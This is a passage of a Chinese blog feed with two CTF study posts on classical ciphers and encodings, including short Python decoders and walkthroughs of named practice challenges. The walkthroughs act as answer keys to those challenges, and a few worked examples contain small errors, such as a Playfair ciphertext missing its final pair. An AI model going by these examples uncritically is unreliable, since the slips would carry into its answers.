rel="noopener">https://quipqiup.com/</a></strong></p><p><img src="https://pic3.zhimg.com/80/v2-8a82b177919a7e61bcc1d84ff940acb2_720w.jpg" alt="img"></p><h3 id="四方密码在线加解密网站："><a href="#四方密码在线加解密网站：" class="headerlink" title="四方密码在线加解密网站："></a>四方密码在线加解密网站：</h3><p><a href="https://link.zhihu.com/?target=http%3A//ctf.ssleye.com/four.html" target="_blank" rel="noopener">http://ctf.ssleye.com/four.html</a></p><h2 id="培根密码："><a href="#培根密码：" class="headerlink" title="培根密码："></a><strong>培根密码：</strong></h2><p>培根密码直接根据表中的字母进行转换。</p><p>密文一般只含有a和b字母</p><p><img src="https://pic1.zhimg.com/80/v2-9e23a167e68739049ecb21cdde085a98_720w.jpg" alt="img"></p><p>培根密码在线解密：</p><p><a href="https://link.zhihu.com/?target=https%3A//tool.bugku.com/peigen/" target="_blank" rel="noopener">https://tool.bugku.com/peigen/</a></p><p>培根密码真题-one：</p><p>攻防世界crypto新手-不仅仅是morse</p><p><img src="https://pic4.zhimg.com/80/v2-bc8cc8808aa0560f4811c4e0c2283a3f_720w.jpg" alt="img"></p><p>把/转换成空格。直接拿出morse解密</p><p><img src="https://pic3.zhimg.com/80/v2-7712dc9ce03f0cbad6f2e3cf68b19062_720w.jpg" alt="img"></p><p>在看后面一段像培根密码，根据题目提示是食物加密。</p><p><img src="https://pic2.zhimg.com/80/v2-8f60398906141bf4062ade9faa45787d_720w.jpg" alt="img"></p><h2 id="标准银河字母："><a href="#标准银河字母：" class="headerlink" title="标准银河字母："></a><strong>标准银河字母：</strong></h2><p>标准银河字母（Standard Galactic Alphabet）出自游戏《指挥官基恩》系列。是系列中使用的书写系统。这是一个简单的替代暗号，用不同的符号取代拉丁字母。SGA可以在不同的语言中使用，比如在游戏《Minecraft》，《指挥官基恩》中。</p><p>如果遇到这类题。直接根据题目来进行图翻-&gt;字母</p><p><img src="https://pic3.zhimg.com/80/v2-ba0f6c12d8d4c71bc1f36c0faa472272_720w.jpg" alt="img"></p><h2 id="圣堂武士密码："><a href="#圣堂武士密码：" class="headerlink" title="圣堂武士密码："></a><strong>圣堂武士密码：</strong></h2><p>圣堂武士密码(Templar Cipher)是共济会的“猪圈密码”的一个变种,一直被共济会圣殿骑士用。</p><p>直接根据图片上的直接翻译出字母即可</p><p><img src="https://pic1.zhimg.com/80/v2-1fbce927928b8189a662418fa9655394_720w.jpg" alt="img"></p><h2 id="猪圈密码："><a href="#猪圈密码：" class="headerlink" title="猪圈密码："></a><strong>猪圈密码：</strong></h2><p>猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码。即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。</p><p>直接图片替换字母即可</p><p><img src="https://pic4.zhimg.com/80/v2-c20685d002fe2653944302a1c12a5327_720w.jpg" alt="img"></p><h3 id="猪圈密码在线解密网站："><a href="#猪圈密码在线解密网站：" class="headerlink" title="猪圈密码在线解密网站："></a><strong>猪圈密码在线解密网站：</strong></h3><p><a href="https://link.zhihu.com/?target=http%3A//www.metools.info/code/c90.html" target="_blank" rel="noopener">http://www.metools.info/code/c90.html</a></p><p>猪圈密码真题：</p><p>Buuctf-crypto-萌萌哒的八戒</p><p><img src="https://pic4.zhimg.com/80/v2-64cefda059f2f55f522ad0ca6e81f74f_720w.jpg" alt="img"></p><p>直接解密</p><p><img src="https://pic4.zhimg.com/80/v2-87186735e3b7ee8e57ca015e5cecddd3_720w.jpg" alt="img"></p><p>猪圈密码-圣堂武士密码-标准银河字母-栅栏密码真题：</p><p>Buuctf-Crypto- [MRCTF2020]古典密码知多少</p><p><img src="https://pic4.zhimg.com/80/v2-52004a0174178967f87f54236b8d01bf_720w.jpg" alt="img"></p><p><img src="https://pic1.zhimg.com/80/v2-1b31253a3056562005cb5f6ac911ed30_720w.jpg" alt="img"></p><p>图上的蓝色就是猪圈密码，橙色的是圣堂武士密码，黑色的是银河字母。</p><p><img src="https://pic3.zhimg.com/80/v2-61739e1b2e5a4eed51c7bf7abb7a3f26_720w.jpg" alt="img"></p><p><img src="https://pic2.zhimg.com/80/v2-c7a82d3ea6d815257627ee9273676061_720w.jpg" alt="img"></p><h2 id="当铺密码："><a href="#当铺密码：" class="headerlink" title="当铺密码："></a><strong>当铺密码：</strong></h2><p>当铺密码就是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几。例如：</p><p>口 0    田 0    由 1    中 2    人 3    工 4</p><p>大 5    王 6    夫 7    井 8    羊 9</p><p>具体映射可查看：</p><p><a href="https://link.zhihu.com/?target=https%3A//www.cnblogs.com/cc11001100/p/9357263.html" target="_blank" rel="noopener">https://www.cnblogs.com/cc11001100/p/9357263.html</a></p><p>当铺密码真题：</p><p>Buuctf-crypto-GKCTF2020汉字的秘密</p><p><img src="https://pic2.zhimg.com/80/v2-9abe603c0eef1e0746f91ec04dc24aad_720w.jpg" alt="img"></p><p><img src="https://pic4.zhimg.com/80/v2-fb9478ec0839e5017f8cd83cef8bfbb7_720w.jpg" alt="img"></p><p>直接解码发现不对。</p><p><img src="https://pic4.zhimg.com/80/v2-65054bc4d94d218e47c6b7229e799357_720w.jpg" alt="img"></p><p>翻看ascii码。改进一下脚本：</p><p>自己猜一下flag开头为flag。可以看到ascii嘛每一位都是递增的。</p><p>差为1,2,3,4</p><p><img src="https://pic3.zhimg.com/80/v2-f2ccb7e18e9b325dc067e5d977740536_720w.jpg" alt="img"></p><h2 id="跳舞的小人密码："><a href="#跳舞的小人密码：" class="headerlink" title="跳舞的小人密码："></a><strong>跳舞的小人密码：</strong></h2><p>跳舞的人，讲的是一个黑帮发明的一种密码，其密码就是用一个一个的跳舞的小人组成的，一个小人是一个字母。有人用这种密码进行通信，来威胁某人，福尔摩斯后来破解了这个密码，抓住了坏人。</p><p>这题直接根据表来进行转换即可。加解密同</p><p><img src="https://pic1.zhimg.com/80/v2-bfa0f0835ce4a7ec0dae25be5c3d40a4_720w.jpg" alt="img"></p><p>这题感觉是做过的。但没翻到例题。就不放了。</p><h2 id="希尔密码（hill）："><a href="#希尔密码（hill）：" class="headerlink" title="希尔密码（hill）："></a><strong>希尔密码（hill）：</strong></h2><p>希尔密码（Hill Cipher）是运用基本矩阵论原理的替换密码，由Lester S. Hill在1929年发明。每个字母当作26进制数字：A=0, B=1, C=2… 一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果MOD26。</p><p>直接给出网上的脚本可以参考：</p><pre class="line-numbers language-text"><code class="language-text">import numpy as npm = 'YOURPINNOISFOURONETWOSIX'  #明文a = np.matrix([[11,2,19],[5,23,25],[20,7,17]])  #密钥LCTFXZUHRnum_m = []temp = []count = 1for i in m:  #将明文分为三个一组    temp.append(ord(i)-ord('A'))    if count % 3 == 0:        num_m.append(temp)        temp = []    count += 1mat_m = [np.matrix(i).T for i in num_m]  #将明文分组转换为向量形式mat_c = [a * i % 26 for i in mat_m]  #得到密文分组的向量形式num_c = []temp = []for i in mat_c:  #将密文向量转换为列表形式，且合并到一个列表    temp = i.tolist()    for j in range(3):        num_c.append(temp[j][0])c = [chr(i+ord('A')) for i in num_c]print(''.join(c))  #连接成字符串,输出密文<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="希尔密码在线加解密："><a href="#希尔密码在线加解密：" class="headerlink" title="希尔密码在线加解密："></a><strong>希尔密码在线加解密：</strong></h3><p><a href="https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D914" target="_blank" rel="noopener">http://www.atoolbox.net/Tool.php?Id=914</a></p><h2 id="维吉尼亚密码："><a href="#维吉尼亚密码：" class="headerlink" title="维吉尼亚密码："></a><strong>维吉尼亚密码：</strong></h2><p>维吉尼亚密码（又译维热纳尔密码）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。</p><p>维吉尼亚加解密表格：</p><p><img src="https://pic2.zhimg.com/80/v2-0256b1f8fe704260074c03e4b2696ef5_720w.jpg" alt="img"></p><p>当明文为</p><p>ATTACKATDAWN</p><p>选择某一关键词并重复而得到密钥，如关键词为LEMON时，密钥为：</p><p>LEMONLEMONLE</p><p>对于明文的第一个字母A，对应密钥的第一个字母L，于是使用表格中L行字母表进行加密，得到密文第一个字母L。类似地，明文第二个字母为T，在表格中使用对应的E行进行加密，得到密文第二个字母X。以此类推，可以得到：</p><p>明文：ATTACKATDAWN</p><p>密钥：LEMONLEMONLE</p><p>密文：LXFOPVEFRNHR</p><h3 id="维吉尼亚密码在线加解密："><a href="#维吉尼亚密码在线加解密：" class="headerlink" title="维吉尼亚密码在线加解密："></a><strong>维吉尼亚密码在线加解密：</strong></h3><p><a href="https://link.zhihu.com/?target=https%3A//www.qqxiuzi.cn/bianma/weijiniyamima.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/weijiniyamima.php</a></p><p>维吉尼亚密码真题-one：</p><p>BUUCTF-Crypto-[BJDCTF 2nd]燕言燕语-y1ng</p><p>小燕子，穿花衣，年年春天来这里，我问燕子你为啥来，燕子说:</p><p>79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20</p><p>16进制转字符串</p><p><img src="https://pic1.zhimg.com/80/v2-8a3764498e3bbb3b136a4ff59ac70ba0_720w.jpg" alt="img"></p><p>维吉尼亚在线直接解</p><p><img src="https://pic3.zhimg.com/80/v2-2aa851be441a5f864a0b1306eac29392_720w.jpg" alt="img"></p><h2 id="棋盘密码（Polybius）："><a href="#棋盘密码（Polybius）：" class="headerlink" title="棋盘密码（Polybius）："></a><strong>棋盘密码（Polybius）：</strong></h2><p>波利比奥斯棋盘（Polybius Checkerboard）是棋盘密码的一种，是利用波利比奥斯方阵(Polybius  Square)进行加密的密码方式，产生于公元前两世纪的希腊，相传是世界上最早的一种密码。简单的来说就是把字母排列好，用坐标的形式表现出来。字母是密文，明文便是字母的坐标。</p><p>借鉴知乎上的图</p><p><img src="https://pic3.zhimg.com/80/v2-095ef336986fd39db6580115c3a78792_720w.jpg" alt="img"></p><p>先看纵向，在看横向。得到密文</p><p>明文HELLO 密文：23 15 31 31 34</p><h2 id="普莱费尔密码（playfair）："><a href="#普莱费尔密码（playfair）：" class="headerlink" title="普莱费尔密码（playfair）："></a><strong>普莱费尔密码（playfair）：</strong></h2><p>选取一个英文字作密钥。除去重复出现的字母。将密钥的字母逐个逐个加入5×5的矩阵内，剩下的空间将未加入的英文字母依a-z的顺序加入。（将Q去除，或将I和J视作同一字。）</p><p>将要加密的讯息分成两个一组。若组内的字母相同，将X（或Q）插入两字母之间，重新分组（例如 HELLO 将分成 HE LX LO）。若剩下一个字，也加入X字。</p><p>在每组中，找出两个字母在矩阵中的地方。</p><p>若两个字母不在同一直行或同一横列，在矩阵中找出另外两个字母，使这四个字母成为一个长方形的四个角。</p><p>若两个字母在同一横列，取这两个字母右方的字母（若字母在最右方则取最左方的字母）。</p><p>若两个字母在同一直行，取这两个字母下方的字母（若字母在最下方则取最上方的字母）。</p><p>取playfair example为密钥。即可得到表</p><p>P L A Y F</p><p>I R E X M</p><p>B C D G H</p><p>K N O Q S</p><p>T U V W Z</p><p>需要加密的为Hide the gold</p><p>HI DE TH EG OL</p><p>加密后为</p><p>BM OD ZB XD</p><h3 id="在线普莱费尔加解密："><a href="#在线普莱费尔加解密：" class="headerlink" title="在线普莱费尔加解密："></a><strong>在线普莱费尔加解密：</strong></h3><p><a href="https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D912" target="_blank" rel="noopener">http://www.atoolbox.net/Tool.php?Id=912</a></p><p><a href="https://link.zhihu.com/?target=http%3A//rumkin.com/tools/cipher/playfair.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/playfair.php</a></p><p>普莱费尔真题-one：</p><p>Buuctf-crypto-cipher</p><p>还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu 注意：得到的 flag 请包上 flag{} 提交, flag{小写字母}</p><p><a href="https://link.zhihu.com/?target=http%3A//rumkin.com/tools/cipher/playfair.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/playfair.php</a></p><p><img src="https://pic2.zhimg.com/80/v2-2be2d0bcb297711754a46296432e8f3d_720w.jpg" alt="img"></p><h2 id="Nihilist密码："><a href="#Nihilist密码：" class="headerlink" title="Nihilist密码："></a><strong>Nihilist密码：</strong></h2><p>Nihilist跟polybius密码差不多</p><p>相同的先看纵向，在看横向。</p><p>例如a=[2,3]=23</p><p><img src="https://pic2.zhimg.com/80/v2-929026378b34e6fd342567e8adf92a2d_720w.jpg" alt="img"></p><h2 id="Keyboard密码："><a href="#Keyboard密码：" class="headerlink" title="Keyboard密码："></a><strong>Keyboard密码：</strong></h2><p>Keyboard密码在ctf中应该是分多种类型的。这里提两种。即9键表和26键包含</p><p>9键表就是通过九键上多次字母来进行字母提取</p><p>26键包含通过明文多个字符对应一个密文</p><p>9键表真题：</p><p>直接放两道题来理解</p><p>Buuctf- Crypto-[NCTF2019]Keyboard</p><p><img src="https://pic1.zhimg.com/80/v2-7ab75ce548f7ec78fb0dcc1c305d78b8_720w.jpg" alt="img"></p><p>分析第一个字符串，ooo，o在键盘上对应的是9，有3个o，表示第9个格子的第三个字母，就是y。那yyy就是指字母o</p><p><img src="https://pic1.zhimg.com/80/v2-5579f6bceb2f7b7be87c13a30ae19628_720w.jpg" alt="img"></p><p>cipher=”ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee”</p><p>base=” qwertyuiop”</p><p>a=[“ “,” “,”abc”,”def”,”ghi”,”jkl”,”mno”,”pqrs”,”tuv”,”wxyz”]</p><p>#print(base.index(“q”))</p><p>for part in cipher.split(“ “):</p><p>  s=base.index(part[0])</p><p>  count=len(part)</p><p>  #print(a[9][2],end=””)</p><p>  print(a[s][count-1],end=””)</p><p>第一步：</p><p><strong>构造3个需要的值，变量和列表</strong></p><p><strong>cipher就是题目附件的字符串</strong></p><p><strong>base就是键盘上一行对应的数字，第一个为空。因为索引的时候，第一个为0。使得q正好为1</strong></p><p><strong>a列表第一个的空格字符串同理。也是0。如下走下来空格对应九格键盘上的1，abc就对应九格键盘上的数字2，def对应3。</strong></p><p>第二步：</p><p>index就是索引的值，就是取键盘上的数字</p><p><img src="https://pic2.zhimg.com/80/v2-8370c8c5599d16c927c2a7216487abdd_720w.jpg" alt="img"></p><p><strong>a[][]。列表的两次，就直接取对应的字母了。end是为了不换行。</strong></p><p><img src="https://pic3.zhimg.com/80/v2-24e40bf3a20626da1ee809fac0c5637e_720w.jpg" alt="img"></p><p><strong>count的减1，还是因为第一个是0</strong></p><p><img src="https://pic4.zhimg.com/80/v2-e307810ec18c982899f092d77449e2f3_720w.jpg" alt="img"></p><p>Buuctf- Crypo-[MRCTF2020]keyboard</p><p>得到的flag用</p><p>MRCTF{xxxxxx}形式上叫</p><p>都为小写字母</p><p>6</p><p>666</p><p>22</p><p>444</p><p>555</p><p>33</p><p>7</p><p>44</p><p>666</p><p>66</p><p>3</p><p><img src="https://pic1.zhimg.com/80/v2-857b995784eef5b15242292fdc9d57d4_720w.jpg" alt="img"></p><p>str=”6 666 22 444 555 33 7 44 666 66 3”</p><p>a=[“ “,” “,”abc”,”def”,”ghi”,”jkl”,”mno”,”pqrs”,”tuv”,”wxyz”]</p><p>for i in str.split(“ “):</p><p>  s=int(i[0])</p><p>  count=len(i)</p><p>  print(a[s][count-1],end=””)</p><p><strong>这边解出来最后一个字母是d。但提交不上。搜一下这个单词就知道最后一个应该打错了。是e</strong></p><p>26键包含真题：</p><p>实验吧-密码学-keyword</p><p><img src="https://pic4.zhimg.com/80/v2-e070e8a0e26fa380290d53e7d2704093_720w.jpg" alt="img"></p><p>根据题目hint：应该。是键盘包围，或者画图</p><p>BHUK,LP TGBNHGYT BHUK,LP UYGBN TGBNHGYT BHUK,LP BHUK,LP TGBNHGYT BHUK,LP TGBNHGYT UYGBN</p><p>空格划组 逗号也算一个里面</p><p>直接画出来</p><p>NBNCBNNBNBC</p><h2 id="栅栏密码："><a href="#栅栏密码：" class="headerlink" title="栅栏密码："></a><strong>栅栏密码：</strong></h2><p>栅栏密码是典型的置换密码。把明文分成n个1组。在进行连接。根据如何连接，又分为普通栅栏密码（|||栅栏密码）和W型栅栏密码。</p><p>普通栅栏密码（|||栅栏密码）</p><p>值和n：</p><p>fslda1g2{3a}</p><p>n=2</p><p>按2个分组</p><p>fs  ld  a1  g2  {3  a}</p><p>取第一个</p><p>flag{a</p><p>在取全部</p><p>flag{asd123}</p><p>普通栅栏密码（|||栅栏密码）真题-one：</p><p>Buuctf-Crypto-篱笆墙的影子</p><p>直接两栏获得flag</p><p><img src="https://pic1.zhimg.com/80/v2-ecb70e84f97468a9c5eed6923bc6a2f0_720w.jpg" alt="img"></p><p>w型栅栏密码</p><p>写成W型的栅栏密码。但读取还是按行从左往右读取。</p><p>值和n：</p><p>flag{asd123}</p><p>n=2</p><p>照样是2个分组</p><p>f.a.{.s.1.3</p><p>.l.g.a.d.2.}</p><p>直接从左往右读取</p><p>fa{s13lgad2}</p><p>W型栅栏密码真题-one：</p><p>攻防世界Crypto新手-Railfence</p><p>根据题目名和题目描述可知是栅栏密码。</p><p><img src="https://pic4.zhimg.com/80/v2-bb5b130d16c4a1530b1a1d0403ee7e8f_720w.jpg" alt="img"></p><p>但不是普通的|||型栅栏密码</p><p>是变种的W型栅栏密码</p><h3 id="在线解密："><a href="#在线解密：" class="headerlink" title="在线解密："></a><strong>在线解密：</strong></h3><p><a href="https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D777" target="_blank" rel="noopener">http://www.atoolbox.net/Tool.php?Id=777</a></p><p><img src="https://pic3.zhimg.com/80/v2-090a754d2d59387491b0becd12bf1c92_720w.jpg" alt="img"></p><p>手解：</p><p>把值按照W型进行横排排列，把明文的第一个填充到密文的第一行第1个位置，把明文的第二个填充到密文的第一行第9个位置。在把明文的第三个填充到密文的第17个位置。在把明文的第四个填充到密文的第25个位置。在把明文的第五个填充到密文的第33个位置。</p><p><img src="https://pic1.zhimg.com/80/v2-bdccd3e6610deff7b3399f83385cd15c_720w.jpg" alt="img"></p><p>当len=35，key=5时（这个就自己画一画吧）然后你就会发现：首行和尾行的间隔依旧不变，假设行数为i，当当前数为第2行的奇数的时候，下一个数字为2+6=8也就是（key-i）<em>2,若当前数为第二行偶数的时候，下一个数字为8+2=10也就是(i-1)</em>2。</p><p><img src="https://pic4.zhimg.com/80/v2-02d6283fe27ea56f8d866bd028d3189f_720w.jpg" alt="img"></p><h4 id="普通栅栏密码加解密："><a href="#普通栅栏密码加解密：" class="headerlink" title="普通栅栏密码加解密："></a>普通栅栏密码加解密：</h4><p><a href="https://link.zhihu.com/?target=https%3A//www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p><h4 id="W型栅栏密码在线加解密："><a href="#W型栅栏密码在线加解密：" class="headerlink" title="W型栅栏密码在线加解密："></a>W型栅栏密码在线加解密：</h4><p><a href="https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D777" target="_blank" rel="noopener">http://www.atoolbox.net/Tool.php?Id=777</a></p><h2 id="云影密码："><a href="#云影密码：" class="headerlink" title="云影密码："></a><strong>云影密码：</strong></h2><p>有1，2，4，8这四个数字，可以通过加法来用这四个数字表示0-9中的任何一个数字，列如0=28， 也就是0=2+8，同理7=124，  9=18。这样之后再用1-26来表示26个英文字母，就有了密文与明文之间的对应关系。引入0来作为间隔，以免出现混乱。所以云影密码又叫“01248密码”。</p><p>也给出一个python脚本地址：</p><p><a href="https://link.zhihu.com/?target=https%3A//www.jianshu.com/p/b5aa5cf60f83" target="_blank" rel="noopener">https://www.jianshu.com/p/b5aa5cf60f83</a></p><pre class="line-numbers language-text"><code class="language-text">#!/usr/bin/python# -*- coding=utf8 -*-"""# @Author : pig# @CreatedTime:2019-11-2423:54:02# @Description : """def de_code(c):    dic = [chr(i) for i in range(ord("A"), ord("Z") + 1)]    flag = []    c2 = [i for i in c.split("0")]    for i in c2:        c3 = 0        for j in i:            c3 += int(j)        flag.append(dic[c3 - 1])    return flagdef encode(plaintext):    dic = [chr(i) for i in range(ord("A"), ord("Z") + 1)]    m = [i for i in plaintext]    tmp = [];flag = []    for i in range(len(m)):        for j in range(len(dic)):            if m[i] == dic[j]:                tmp.append(j + 1)    for i in tmp:        res = ""        if i >= 8:            res += int(i/8)*"8"        if i%8 >=4:            res += int(i%8/4)*"4"        if i%4 >=2:            res += int(i%4/2)*"2"        if i%2 >= 1:            res += int(i%2/1)*"1"        flag.append(res + "0")    print ("".join(flag)[:-1])c = input("输入要解密的数字串:")print (de_code(c))m_code = input("请输入要加密的数字串:")encode(m_code)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="简单位移密码："><a href="#简单位移密码：" class="headerlink" title="简单位移密码："></a><strong>简单位移密码：</strong></h2><p>这个密码是我在《ctf特训营》这本书上看到的。自己并没有在题目中做到过</p><p>实例借鉴书中</p><p>m=flag{easy_easy_crypto}</p><p>k=”3124”</p><p>len(k)=4，切分m。</p><p>flay {eas y_ea sy_c rypt o}</p><p>按照3124直接排列</p><p>Lafg ea{s _eya y_sc yprt }o</p><p>密文：</p><p>Lafgea{s_eyay_scyprt}o</p><p>解密代码：</p><pre class="line-numbers language-text"><code class="language-text">def shift_decrypt(c,k):    l=len(k)    m=""    for i in range(0,len(c),l):        tmp_m=[""]*l        if i+l>=len(c):            tmp_c=c[i:]            use=[]            for kindex in range(len(tmp_c)):                use.append(int(k[kindex])-l)            use.sort()            for kindex in range(len(tmp_c)):                tmp_m[kindex]=tmp_c[use.index(int(k[kindex])-l)]        else:            tmp_c=c[i:i+l]            for kindex in range(len(tmp_c)):                tmp_m[kindex]=tmp_c[int(k[kindex])-1]        m+="".join(tmp_m)    return mc="lafgea{s_eyay_scyprt}o"k="3124"print shift_decrypt(c,k)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="曲路密码："><a href="#曲路密码：" class="headerlink" title="曲路密码："></a><strong>曲路密码：</strong></h2><p>按照事先约定的原则把明文填入表中</p><p>例如：明文为HelloWorldab</p><p><img src="https://pic3.zhimg.com/80/v2-c8e5bd0d1dfa3ececd04d2d2bd49863a_720w.jpg" alt="img"></p><p>按照一定的顺序进行遍历</p><p>密文就是lrbaoleWdloH</p><p><strong>CTF crypto线下工具推荐：</strong></p><p><strong>CTFCrackTools</strong></p><p><a href="https://link.zhihu.com/?target=https%3A//github.com/Acmesec/CTFCrackTools" target="_blank" rel="noopener">https://github.com/Acmesec/CTFCrackTools</a></p><p><img src="https://pic4.zhimg.com/80/v2-1131910e2546d1455cf91261f8369e73_720w.jpg" alt="img"></p><p><strong>CyberChef</strong></p><p><a href="https://link.zhihu.com/?target=https%3A//www.chinabaiker.com/cyberchef.htm" target="_blank" rel="noopener">https://www.chinabaiker.com/cyberchef.htm</a></p><p>直接可以下载到本地</p><p><img src="https://pic1.zhimg.com/80/v2-aa7579316f632a3a6351bb73f1bf9840_720w.jpg" alt="img"></p><p><strong>参考：</strong></p><p><a href="https://link.zhihu.com/?target=https%3A//ctf-wiki.github.io/ctf-wiki/crypto" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto</a></p><p><a href="https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki</a></p><p><a href="https://link.zhihu.com/?target=https%3A//baike.baidu.com" target="_blank" rel="noopener">https://baike.baidu.com</a></p><p>《ctf特训营》</p><p><a href="https://link.zhihu.com/?target=https%3A//buuoj.cn/" target="_blank" rel="noopener">https://buuoj.cn/</a></p><p><strong>相关实验：</strong></p><p>相关实验：密码学原理</p><p><a href="https://link.zhihu.com/?target=https%3A//sourl.cn/9cMsyV" target="_blank" rel="noopener">课程:密码学原理(合天网安实验室)</a></p><p>（密码学是研究如何隐密地传递信息的学科。通过本课程实验掌握密码学的相关知识。）</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf常见加密</title>
      <link href="/2020/10/01/2020-10-01-ctf-chang-jian-jia-mi/"/>
      <url>/2020/10/01/2020-10-01-ctf-chang-jian-jia-mi/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="CTF中常见的加密"><a href="#CTF中常见的加密" class="headerlink" title="CTF中常见的加密"></a>CTF中常见的加密</h1><h2 id="1-凯撒密码"><a href="#1-凯撒密码" class="headerlink" title="1.凯撒密码"></a><strong>1.凯撒密码</strong></h2><p>通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。只需简单地统计字频就可以破译</p><p><strong>经典的凯撒加密算法是移动3位</strong></p><h2 id="2-base64"><a href="#2-base64" class="headerlink" title="2.base64"></a>2.<strong>base64</strong></h2><p>是网络上最常见的用于传输8Bit<a href="http://baike.baidu.com/item/字节代码" target="_blank" rel="noopener">字节代码</a>的编码方式之一</p><p><strong>特征：Base64就是用下列总计64个字符：</strong></p><p><strong>A-Z a-z 0-9 + /</strong></p><p>Base64字符串的长度必然<strong>是4的整数倍</strong></p><p>Base64很多都是以=或==结尾的。但是注意，也存在不以=或==结尾的Base64，只要编码的二进制字节数恰好被3给整除。</p><h2 id="3-rot13"><a href="#3-rot13" class="headerlink" title="3.rot13"></a>3.<strong>rot13</strong></h2><p>ROT13（回转13位，rotateby13places，有时中间加了个减号称作ROT-13）是一种简易的置换暗码。它是一种在网路论坛用作隐藏八卦、妙句、谜题解答以及某些脏话的工具，目的是逃过版主或管理员的匆匆一瞥。</p><p><strong>特征：再rot13加密一次得到明文</strong></p><p>套用ROT13到一段文字上仅仅只需要检查字元字母顺序并取代它在13位之后的对应字母，有需要超过时则重新绕回26英文字母开头即可[2]。A换成N、B换成O、依此类推到M换成Z，然后序列反转：N换成A、O换成B、最后Z换成M。</p><h2 id="4-md5"><a href="#4-md5" class="headerlink" title="4.md5"></a>4.<strong>md5</strong></h2><p>MD5以512位分组来处理输入文本，每一分组又划分为16个32位子分组。算法的输出由四个32位分组组成，将它们级联形成一个128位散列值。</p><h2 id="5-sha1"><a href="#5-sha1" class="headerlink" title="5.sha1"></a>5.<strong>sha1</strong></h2><p>对于长度小于2^64位的消息，SHA1会产生一个160位的消息摘要</p><h2 id="6-crc32"><a href="#6-crc32" class="headerlink" title="6.crc32"></a>6.<strong>crc32</strong></h2><p>在诸多检错手段中，CRC是最著名的一种。CRC的全称是循环冗余校验。</p><p><strong>特征：CRC32的计算结果只有8位</strong></p><h2 id="7-Uuencode"><a href="#7-Uuencode" class="headerlink" title="7.Uuencode"></a><strong>7.Uuencode</strong></h2><p>uuencode是将二进制文件转换为文本文件的过程，转换后的文件可以通过纯文本e-mail进行传输，在接收方对该文件进行uudecode，即将其转换为初始的二进制文件。</p><p><strong>特征：每行都是以M开头</strong></p><p> 编码算法为不断地用3个字节数据列成一组(不足3个字节以零补齐)然后 此24位数据分为4 组,每组6位,再将得到的6位二进制数映射到ASCII码32~95之间的字符,而每行以M 开头(表示32+45),60个字符一行(包括”M”),最后一行以32+N 的ASCII字符开头,N 为最后一行编码的输入字节数.编码以一个只含一个空格的一行和只含”end”的一行结束.</p><h2 id="8-栅栏密码"><a href="#8-栅栏密码" class="headerlink" title="8.栅栏密码"></a>8.<strong>栅栏密码</strong></h2><p>就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。</p><p>一般比较常见的是2栏的栅栏密码。</p><p>比如<a href="http://baike.baidu.com/item/明文" target="_blank" rel="noopener">明文</a>：THERE IS A CIPHER</p><p>去掉空格后变为：THEREISACIPHER</p><p>两个一组，得到：TH ER EI SA CI PH ER</p><p>先取出第一个字母：TEESCPE</p><p>再取出第二个字母：HRIAIHR</p><p>连在一起就是：TEESCPEHRIAIHR</p><p>还原为所需密码。</p><p>而解密的时候，我们先把密文从中间分开，变为两行：</p><p>T E E S C P E</p><p>H R I A I H R</p><p>再按上下上下的顺序组合起来：</p><p>THEREISACIPHER</p><p>分出空格，就可以得到原文了：</p><p>THERE IS A CIPHER</p><p>明文：THERE IS A CIPHER</p><p>七个一组：THEREIS 